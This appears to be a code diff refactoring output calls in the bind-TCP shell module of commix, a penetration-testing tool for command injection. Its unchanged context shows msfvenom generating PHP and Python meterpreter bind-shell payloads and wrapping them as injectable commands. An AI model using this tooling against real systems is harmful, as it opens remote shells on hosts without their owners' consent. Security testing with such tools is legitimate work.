@@ -31,7 +31,7 @@ Check for available shell options.
 def shell_options(option):
   if option.lower() == "bind_tcp":
     warn_msg = "You are into the '" + option.lower() + "' mode."
-    print(settings.print_warning_msg(warn_msg))
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
   elif option.lower() == "?":
     menu.reverse_tcp_options()
   elif option.lower() == "quit" or option.lower() == "exit":
@@ -42,7 +42,7 @@ def shell_options(option):
     if option[4:10].lower() == "lhost ":
       err_msg =  "The '" + option[4:9].upper() + "' option, is not "
       err_msg += "usable for 'bind_tcp' mode. Use 'RHOST' option."
-      print(settings.print_error_msg(err_msg))
+      settings.print_data_to_stdout(settings.print_error_msg(err_msg))
     if option[4:10].lower() == "lport ":
       check_lport(option[10:])
   else:
@@ -53,24 +53,24 @@ Success msg.
 """
 def shell_success():
   info_msg = "Everything is in place, cross your fingers and check for bind shell (on port " + settings.LPORT + ").\n"
-  sys.stdout.write(settings.print_info_msg(info_msg))
-  sys.stdout.flush()
+  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+  
 
 """
 Error msg if the attack vector is available only for Windows targets.
 """
 def windows_only_attack_vector():
     error_msg = "This attack vector is available only for Windows targets."
-    print(settings.print_error_msg(error_msg))
+    settings.print_data_to_stdout(settings.print_error_msg(error_msg))
 
 """
 Message regarding the MSF handler.
 """
 def msf_launch_msg(output):
     info_msg = "Type \"msfconsole -r " + os.path.abspath(output) + "\" (in a new window)."
-    print(settings.print_info_msg(info_msg))
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
     info_msg = "Once the loading is done, press here any key to continue..."
-    sys.stdout.write(settings.print_info_msg(info_msg))
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
     sys.stdin.readline().replace("\n", "")
     # Remove the ouput file.
     os.remove(output)
@@ -140,7 +140,7 @@ check / set rhost option for bind TCP connection
 """
 def check_rhost(rhost):
   settings.RHOST = rhost
-  print("RHOST => " + settings.RHOST)
+  settings.print_data_to_stdout("RHOST => " + settings.RHOST)
   return True
 
 """
@@ -150,11 +150,11 @@ def check_lport(lport):
   try:
     if float(lport):
       settings.LPORT = lport
-      print("LPORT => " + settings.LPORT)
+      settings.print_data_to_stdout("LPORT => " + settings.LPORT)
       return True
   except ValueError:
     err_msg = "The provided port must be numeric (i.e. 1234)"
-    print(settings.print_error_msg(err_msg))
+    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
     return False
 
 
@@ -255,15 +255,15 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + 
 
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
-        print(settings.print_error_msg(error_msg))
+        settings.print_data_to_stdout(settings.print_error_msg(error_msg))
         continue
 
       payload = "php/bind_php"
       output = "php_bind_tcp.rc"
 
       info_msg = "Generating the '" + payload + "' payload. "
-      sys.stdout.write(settings.print_info_msg(info_msg))
-      sys.stdout.flush()
+      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+      
       try:
         proc = subprocess.Popen("msfvenom -p " + str(payload) +
           " RHOST=" + str(settings.RHOST) +
@@ -274,7 +274,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + 
           data = content_file.readlines()
           data = ''.join(data).replace("\n",settings.SINGLE_WHITESPACE)
 
-        print(settings.SINGLE_WHITESPACE)
+        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -291,7 +291,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + 
           other_shell = "php -r \"" + data + "\""
         msf_launch_msg(output)
       except:
-        print(settings.SINGLE_WHITESPACE)
+        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
 
       break
 
@@ -346,15 +346,15 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + 
 
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
-        print(settings.print_error_msg(error_msg))
+        settings.print_data_to_stdout(settings.print_error_msg(error_msg))
         continue
 
       payload = "php/meterpreter/bind_tcp"
       output = "php_meterpreter.rc"
 
       info_msg = "Generating the '" + payload + "' payload. "
-      sys.stdout.write(settings.print_info_msg(info_msg))
-      sys.stdout.flush()
+      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+      
       try:
         proc = subprocess.Popen("msfvenom -p " + str(payload) +
           " RHOST=" + str(settings.RHOST) +
@@ -365,7 +365,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + 
           data = content_file.readlines()
           data = ''.join(data).replace("\n",settings.SINGLE_WHITESPACE)
 
-        print(settings.SINGLE_WHITESPACE)
+        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -382,7 +382,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + 
           other_shell = "php -r \"" + data + "\""
         msf_launch_msg(output)
       except:
-        print(settings.SINGLE_WHITESPACE)
+        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
       break
 
     # Python-bind-shell(meterpreter)
@@ -390,15 +390,15 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + 
 
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
-        print(settings.print_error_msg(error_msg))
+        settings.print_data_to_stdout(settings.print_error_msg(error_msg))
         continue
 
       payload = "python/meterpreter/bind_tcp"
       output = "py_meterpreter.rc"
 
       info_msg = "Generating the '" + payload + "' payload. "
-      sys.stdout.write(settings.print_info_msg(info_msg))
-      sys.stdout.flush()
+      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+      
       try:
         proc = subprocess.Popen("msfvenom -p " + str(payload) +
           " RHOST=" + str(settings.RHOST) +
@@ -410,7 +410,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + 
           data = ''.join(data)
           #data = base64.b64encode(data.encode(settings.DEFAULT_CODEC)).decode()
 
-        print(settings.SINGLE_WHITESPACE)
+        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -430,7 +430,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + 
           other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c " + "\"" + data + "\""
         msf_launch_msg(output)
       except:
-        print(settings.SINGLE_WHITESPACE)
+        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
       break
     # Check for available shell options
     elif any(option in other_shell.lower() for option in settings.SHELL_OPTIONS):
@@ -456,7 +456,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp""" + Style.RESET_ALL + """) >
 
     if bind_tcp_option.lower() == "bind_tcp":
       warn_msg = "You are into the '" + bind_tcp_option.lower() + "' mode."
-      print(settings.print_warning_msg(warn_msg))
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
       continue
 
     # Option 1 - Netcat shell
@@ -493,11 +493,11 @@ Set up the bind TCP connection
 def configure_bind_tcp(separator):
   # Set up rhost for the bind TCP connection
   while True:
-    sys.stdout.write(settings.BIND_TCP_SHELL)
+    settings.print_data_to_stdout(settings.END_LINE.CR + settings.BIND_TCP_SHELL)
     option = _input()
     if option.lower() == "bind_tcp":
       warn_msg = "You are into the '" + option.lower() + "' mode."
-      print(settings.print_warning_msg(warn_msg))
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
       continue
     elif option.lower() == "?":
       menu.bind_tcp_options()
@@ -525,7 +525,7 @@ def configure_bind_tcp(separator):
       elif option[4:10].lower() == "lhost ":
         err_msg =  "The '" + option[4:9].upper() + "' option, is not "
         err_msg += "usable for 'bind_tcp' mode. Use 'RHOST' option."
-        print(settings.print_error_msg(err_msg))
+        settings.print_data_to_stdout(settings.print_error_msg(err_msg))
         continue
       elif option[4:10].lower() == "lport ":
         if check_lport(option[10:]):
